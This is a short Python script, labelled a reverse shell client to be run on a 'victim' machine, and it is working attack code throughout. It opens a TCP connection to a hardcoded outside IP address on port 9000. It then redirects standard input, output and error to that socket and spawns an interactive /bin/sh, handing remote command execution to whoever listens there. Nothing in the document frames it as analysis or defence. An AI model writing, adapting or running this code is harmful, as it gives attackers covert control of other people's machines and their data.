#!/usr/bin/env python3
# reverse_shell_client.py — runs on the VICTIM machine

import socket
import subprocess
import os

ATTACKER_IP = "207.148.127.187"
ATTACKER_PORT = 9000

# Create a TCP socket and connect back to the attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))

# Redirect stdin, stdout, stderr to the socket
os.dup2(s.fileno(), 0)  # stdin  → socket
os.dup2(s.fileno(), 1)  # stdout → socket
os.dup2(s.fileno(), 2)  # stderr → socket

# Spawn an interactive shell — all I/O now flows through the socket
subprocess.call(["/bin/sh", "-i"])
